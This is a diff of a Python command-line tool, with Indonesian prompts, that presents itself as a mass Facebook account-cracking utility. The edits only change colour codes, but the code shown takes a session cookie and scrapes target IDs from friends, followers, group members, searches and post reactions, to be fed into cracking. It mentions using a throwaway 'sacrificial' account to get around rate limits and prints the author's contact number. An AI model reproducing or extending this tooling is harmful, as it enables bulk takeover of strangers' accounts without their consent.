@@ -32,7 +32,7 @@ def tik():
     titik = [
      '   ']
     for o in titik:
-        print ('\r\x1b[1;97m\n [•] Mohon Tunggu & Bersabar... \n [•] Sedang memeriksa Status '+H+'Premium '+P+'Anda... '+H+'>_< ' + o),
+        print ('\r\x1b[1;97m\n ['+U+'•'+P+'] Mohon Tunggu & Bersabar... \n ['+U+'•'+P+'] Sedang memeriksa Status '+H+'Premium '+P+'Anda... '+H+'>_< ' + o),
         sys.stdout.flush()
         time.sleep(6)
 def jalan(z):
@@ -42,7 +42,7 @@ def jalan(z):
 		time.sleep(0.02)
 def prem():
 	os.system ('clear')
-	jalan(P+' ['+H+'*'+P+'] Status	: '+M+'Tidak Premium '+P+'Maaf')
+	jalan(P+' ['+U+'*'+P+'] Status	: '+M+'Tidak Premium '+P+'Maaf')
 	time.sleep(3)
         
         
@@ -62,16 +62,16 @@ class awokawokawok:
 		if os.path.exists("result/chek.txt") is False: open("result/chek.txt","a")
 		if os.path.exists("cookies/info.txt") is False:
 			os.system("clear")
-			print("\n"+p+"["+H+"*"+P+"] Hallo dunia👋 selamat datang :)")
-			print(p+"["+H+"*"+P+"] Sebuah tools untuk mengCrack akun facebook (Hacking secara massal/acak) ")
-			print(p+"["+H+"*"+P+"] Supaya tools ini dapat di gunakan silahkan masukan cookies facebook anda! ")
-			print(p+"["+H+"*"+P+"] "+m+"Script ini tidak untuk di perjualbelikan!,hubungi whatsap ku jika ada yg jual script ini!")
-			print(p+"["+H+"*"+P+"] "+h+"Whatsapp"+p+" : "+h+"081318306972 ")
+			print("\n"+p+"["+U+"*"+P+"] Hallo dunia👋 selamat datang :)")
+			print(p+"["+U+"*"+P+"] Sebuah tools untuk mengCrack akun facebook (Hacking secara massal/acak) ")
+			print(p+"["+U+"*"+P+"] Supaya tools ini dapat di gunakan silahkan masukan cookies facebook anda! ")
+			print(p+"["+U+"*"+P+"] "+m+"Script ini tidak untuk di perjualbelikan!,hubungi whatsap ku jika ada yg jual script ini!")
+			print(p+"["+U+"*"+P+"] "+h+"Whatsapp"+p+" : "+h+"081318306972 ")
 			print (p+"[#]------------------------------------------------")
-			cookie=input("\n"+P+" ["+H+"?"+P+"] cookies :"+K+" ")
+			cookie=input("\n"+P+" ["+K+"?"+P+"] cookies :"+K+" ")
 			while cookie in (""," "):
 				print (M+' [!] Isi yang benar')
-				cookie=input("\n"+P+" ["+H+"?"+P+"] cookies :"+K+" ")
+				cookie=input("\n"+P+" ["+K+"?"+P+"] cookies :"+K+" ")
 			login(url,{"cookie":cookie})
 			
 	
@@ -89,7 +89,7 @@ class awokawokawok:
 	#def logo_banner(self):
 		#os.system ('clear')
 		#print('\n'+H+' ╦═╗╔═╗╦ ╦   ╔═╗╔═╗╔═╗╦╔═╗╦╔═╗╦  \n ╠╦╝║ ║╚╦╝───║ ║╠╣ ╠╣ ║║  ║╠═╣║  \n ╩╚═╚═╝ ╩    ╚═╝╚  ╚  ╩╚═╝╩╩ ╩╩═╝\n '+P+'[#]------------------------------------------------ \n ['+U+'*'+P+'] Coded by	: '+H+'Roy Octa Firdaus \n '+P+'['+U+'*'+P+'] Facebook	: '+H+'facebook.com/jbfbold \n '+P+'['+U+'*'+P+'] Whatsapp	: '+H+'081318306972  \n \x1b[1;97m[#]------------------------------------------------  ')
-		#print(P+' ['+H+'*'+P+'] Alamat IP	:'+H+' '+ip)
+		#print(P+' ['+U+'*'+P+'] Alamat IP	:'+H+' '+ip)
 		#print(52*'\x1b[1;97m═')
 		
 	
@@ -102,9 +102,9 @@ class awokawokawok:
 		os.system ('clear')
 		ip = requests.get('https://api.ipify.org').text
 		print('\n'+H+' ╦═╗╔═╗╦ ╦   ╔═╗╔═╗╔═╗╦╔═╗╦╔═╗╦  \n ╠╦╝║ ║╚╦╝───║ ║╠╣ ╠╣ ║║  ║╠═╣║  \n ╩╚═╚═╝ ╩    ╚═╝╚  ╚  ╩╚═╝╩╩ ╩╩═╝\n '+P+'[#]------------------------------------------------ \n ['+U+'*'+P+'] Coded by	: '+H+'Roy Octa Firdaus \n '+P+'['+U+'*'+P+'] Facebook	: '+H+'facebook.com/jbfbold \n '+P+'['+U+'*'+P+'] Whatsapp	: '+H+'081318306972  \n \x1b[1;97m[#]------------------------------------------------  ')
-		jalan(P+' ['+K+'*'+P+'] Status	:'+M+' Tidak Premium ')
+		jalan(P+' ['+U+'*'+P+'] Status	:'+M+' Tidak Premium ')
 		time.sleep(0.2)
-		print(P+' ['+K+'*'+P+'] Alamat IP	:'+H+' '+ip)
+		print(P+' ['+U+'*'+P+'] Alamat IP	:'+H+' '+ip)
 		time.sleep(0.2)
 		print(52*'\x1b[1;97m═')
 		time.sleep(0.2)
@@ -124,20 +124,20 @@ class awokawokawok:
 		print(P+" ["+M+"00"+P+"] "+M+"Keluar")
 		print(52*'\x1b[1;97m═')
 		
-		pilih=input(P+' ['+H+'?'+P+'] Pilih :'+K+' ')
+		pilih=input(P+' ['+K+'?'+P+'] Pilih :'+K+' ')
 		while pilih in (""," "):
 			print ('\x1b[1;91m [!] Isi yang benar')
-			pilih=input(P+' ['+H+'?'+P+'] Pilih >'+K+' ')
+			pilih=input(P+' ['+K+'?'+P+'] Pilih >'+K+' ')
 			
 		if pilih in ("3","03"):
 			os.system ('clear')
 			print (logo)
 			print(52*'\x1b[1;97m═')
-			print (P+" [*] Masukkan Username/ID Facebook ")
-			user=input(P+" [?] User ID :"+K+" ")
+			print (P+" ["+U+"*"+P+"] Masukkan Username/ID Facebook ")
+			user=input(P+" ["+K+"?"+P+"] User ID :"+K+" ")
 			while user in (""," "):
 				print ('\x1b[1;91m [!] Isi yang benar')
-				user=input(P+" [?] User ID :"+K+" ")
+				user=input(P+" ["+K+"?"+P+"] User ID :"+K+" ")
 			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
 			try: respon=req.get(usek,cookies=self.cookies).text
 			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
@@ -146,14 +146,14 @@ class awokawokawok:
 			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
 				kembali("\x1b[1;91m [!] Maaf limit, silahkan ganti akun tumbal Anda",self.main_menu)
 			else:
-				print(P+" [*] Nama Akun :"+H+" "+parser(respon,"html.parser").find("title").text)
+				print(P+" ["+U+"*"+P+"] Nama Akun :"+H+" "+parser(respon,"html.parser").find("title").text)
 				longentod=takeuser.followers(respon)
 			
 		elif pilih in ("1","01"):
 			os.system ('clear')
 			print (logo)
 			print(52*'\x1b[1;97m═')
-			print (" [*] Crack daftar teman facebook anda sendiri")
+			print (" ["+U+"*"+P+"] Crack daftar teman facebook anda sendiri")
 			try: respon=req.get(f"{url}/me/friends",cookies=self.cookies).text
 			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
 			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
@@ -165,10 +165,10 @@ class awokawokawok:
 			print (logo)
 			print(52*'\x1b[1;97m═')
 			print ('\x1b[1;97m [!] Pastikan anda sudah bergabung dengan grup ')
-			user=input(P+" ["+H+"?"+P+"] Id group :"+K+" ")
+			user=input(P+" ["+K+"?"+P+"] Id group :"+K+" ")
 			while user in (""," "):
 				print ('\x1b[1;91m [!] Isi yang benar')
-				user=input(P+" ["+H+"?"+P+"] ID Group :"+K+" ")
+				user=input(P+" ["+K+"?"+P+"] ID Group :"+K+" ")
 			usek=f"{url}/browse/group/members/?id={user}"
 			try: respon=req.get(usek,cookies=self.cookies).text
 			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
@@ -177,11 +177,11 @@ class awokawokawok:
 			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
 				kembali("\x1b[1;91m [!] Maaf limit, silahkan ganti akun tumabl Anda",self.main_menu)
 			else:
-				#batas=input(P+" ["+H+"?"+P+"] Jumlah :\x1b[1;93m ")
+				#batas=input(P+" ["+K+"?"+P+"] Jumlah :\x1b[1;93m ")
 				#while batas.isdigit() is False:
 					#print ("\x1b[1;91m [!] Isi yang benar" if batas in (""," ") else ""+M+"[!] harus berupa angka")
-					#batas=input(P+" ["+H+"?"+P+"] jumlah :\x1b[1;93m ")
-				print(P+" ["+H+"*"+P+"] Nama Group :\x1b[1;32m "+parser(respon,"html.parser").find("title").text[8:])
+					#batas=input(P+" ["+K+"?"+P+"] jumlah :\x1b[1;93m ")
+				print(P+" ["+U+"*"+P+"] Nama Group :\x1b[1;32m "+parser(respon,"html.parser").find("title").text[8:])
 				longentod=takeuser.grup(respon,user)
 				#longentod=takeuser.grup(respon,int(batas))
 				
@@ -189,32 +189,32 @@ class awokawokawok:
 			os.system ('clear')
 			print (logo)
 			print(52*'\x1b[1;97m═')
-			print(P+" [*] Contoh Nama :"+H+" Sugiono ")
-			user=input(P+" ["+H+"?"+P+"] Nama :"+K+" ")
+			print(P+" ["+U+"*"+P+"] Contoh Nama :"+H+" Sugiono ")
+			user=input(P+" ["+K+"?"+P+"] Nama :"+K+" ")
 			while user in (""," "):
 				print ('\x1b[1;91m [!] Isi yang benar')
-				user=input(P+" ["+H+"?"+P+"] Nama :"+K+" ")
+				user=input(P+" ["+K+"?"+P+"] Nama :"+K+" ")
 			usek=f"{url}/search/people/?q={user}"
 			try: respon=req.get(usek,cookies=self.cookies).text
 			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
 			if "Maaf, kami tidak menemukan" in respon:
 				kembali(f" \x1b[1;91m[!] dengan nama {user} tidak ditemukan",self.main_menu)
 			else:
-				jumlah=input(P+" ["+H+"?"+P+"] Jumlah :"+K+" ")
+				jumlah=input(P+" ["+K+"?"+P+"] Jumlah :"+K+" ")
 				while jumlah.isdigit() is False:
 					print ("\x1b[1;91m [!] Isi yang benar" if jumlah in (""," ") else " ! harus berupa angka")
-					jumlah=input(P+" ["+H+"?"+P+"] Jumlah :"+K+" ")
+					jumlah=input(P+" ["+K+"?"+P+"] Jumlah :"+K+" ")
 				longentod=takeuser.cari(respon,int(jumlah))
 			
 		elif pilih in ("2","02"):
 			os.system ('clear')
 			print (logo)
 			print(52*'\x1b[1;97m═')
-			print (P+" [*] Masukkan Username/ID Facebook ")
-			user=input(P+" ["+H+"?"+P+"] User ID :"+K+" ")
+			print (P+" ["+U+"*"+P+"] Masukkan Username/ID Facebook ")
+			user=input(P+" ["+K+"?"+P+"] User ID :"+K+" ")
 			while user in (""," "):
 				print ('\x1b[1;91m [!] Isi yang benar')
-				user=input(P+" ["+H+"?"+P+"] User ID :"+K+" ")
+				user=input(P+" ["+K+"?"+P+"] User ID :"+K+" ")
 			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
 			try: respon=req.get(usek,cookies=self.cookies).text
 			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
@@ -225,14 +225,14 @@ class awokawokawok:
 			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
 				kembali(f" \x1b[1;91m[!] ID {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
 			else:
-				print(" \x1b[1;97m["+H+"*"+P+"] Target Name :"+H+" "+parser(respon,"html.parser").find("title").text)
+				print(" \x1b[1;97m["+U+"*"+P+"] Target Name :"+H+" "+parser(respon,"html.parser").find("title").text)
 				longentod=takeuser.fl(respon)
 			
 		elif pilih in ("6","06"):
 			os.system ('clear')
 			print (logo)
 			print(52*'\x1b[1;97m═')
-			print(' [*] Di acc ajg kalau ada yg kirim pertemanan-_ ')
+			print(' ['+U+'*'+P+'] Di acc ajg kalau ada yg kirim pertemanan-_ ')
 			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
 			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
 			if "Tidak Ada Permintaan" in respon:
@@ -243,11 +243,11 @@ class awokawokawok:
 			os.system ('clear')
 			print (logo)
 			print(52*'\x1b[1;97m═')
-			print (P+" ["+H+"*"+P+"] Masukkan Link/ID Postingan ")
-			user=input(" ["+H+"?"+P+"] Url/Id Post :"+K+" ")
+			print (P+" ["+U+"*"+P+"] Masukkan Link/ID Postingan ")
+			user=input(" ["+K+"?"+P+"] Url/Id Post :"+K+" ")
 			while user in (""," "):
 				print ("\x1b[1;91m [!] Isi yang benar")
-				user=input(" ["+H+"?"+P+"] Url/ID Post :"+K+" ")
+				user=input(" ["+K+"?"+P+"] Url/ID Post :"+K+" ")
 			if user.isdigit():
 				user=f"{url}/{user}"
 			else:
@@ -263,7 +263,7 @@ class awokawokawok:
 				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
 				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
 					kembali(" \x1b[1;91m[!] tidak ada yang menanggapi postingan",self.main_menu)
-				jumlah=input("\x1b[1;97m ["+H+"?"+P+"] jumlah :\x1b[1;93m ")
+				jumlah=input("\x1b[1;97m ["+K+"?"+P+"] jumlah :\x1b[1;93m ")
 				while jumlah.isdigit() is False:
 					print(" \x1b[1;91m[!] Isi yang benar" if jumlah in (""," ") else " ! harus berupa angka")
 					jumlah=input(" \x1b[1;97m[?] jumlah :\x1b[1;93m ")
@@ -279,7 +279,7 @@ class awokawokawok:
 			exit(" \x1b[1;91m[!] Gagal menghapus cookie " if os.path.exists("cookies/info.txt") else ""+H+" [✓] sukses menghapus cookie")
 		
 		elif pilih in ("0","00"):
-			exit("\n \x1b[1;97m["+H+"*"+P+"] Terima kasih telah menggunakan tools ini :)")
+			exit("\n \x1b[1;97m["+U+"*"+P+"] Terima kasih telah menggunakan tools ini :)")
 		
 		else:
 			kembali("\x1b[1;91m [!] Isi yang benar",self.main_menu)
